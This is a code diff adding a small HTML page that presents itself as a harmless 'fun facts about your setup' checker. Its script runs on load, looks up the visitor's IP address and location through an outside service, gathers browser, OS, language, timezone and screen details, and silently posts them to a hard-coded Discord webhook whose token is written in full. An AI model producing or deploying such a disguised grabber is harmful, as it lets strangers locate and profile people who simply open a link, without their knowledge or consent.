@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Just Checking Stuff</title>
+</head>
+<body>
+  <h1>Gathering fun facts about your setup...</h1>
+  <script>
+    async function getIPInfo() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        if (!res.ok) throw new Error("Failed to fetch IP info");
+        return await res.json();
+      } catch (err) {
+        console.error("IP fetch error:", err);
+        return { ip: "Unavailable", city: "", region: "", country_name: "" };
+      }
+    }
+
+    async function sendDeviceInfo() {
+      const ipInfo = await getIPInfo();
+
+      const info = {
+        "🌍 IP Address": ipInfo.ip,
+        "📍 Location": `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}`,
+        "🖥️ OS/Platform": navigator.platform,
+        "🌐 Browser": navigator.userAgent,
+        "🗣️ Language": navigator.language,
+        "🕒 Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+        "📶 Online": navigator.onLine ? "Yes" : "No",
+        "📺 Screen": `${window.screen.width}x${window.screen.height} (${screen.orientation?.type || "unknown"})`
+      };
+
+      const webhookUrl = "https://discord.com/api/webhooks/1369355364872753205/KwNFy1fIc4A1ov45CM3d1GI6tkaug4x01gTesPwbWPkCfN9zBF9VzYsSR-stp1cRmY_9";
+
+      try {
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: "Device Inspector 😎",
+            avatar_url: "https://i.imgur.com/AfFp7pu.png",
+            embeds: [{
+              title: "🔍 Here's what I found!",
+              description: "Just checking in with some cool facts about your setup!",
+              color: 0x3498db, // Nice blue
+              fields: Object.entries(info).map(([name, value]) => ({
+                name,
+                value: String(value),
+                inline: false
+              })),
+              footer: {
+                text: "All systems look good 🚀"
+              },
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+        console.log("Info sent to Discord webhook.");
+      } catch (error) {
+        console.error("Failed to send data:", error);
+      }
+    }
+
+    sendDeviceInfo();
+  </script>
+</body>
+</html>
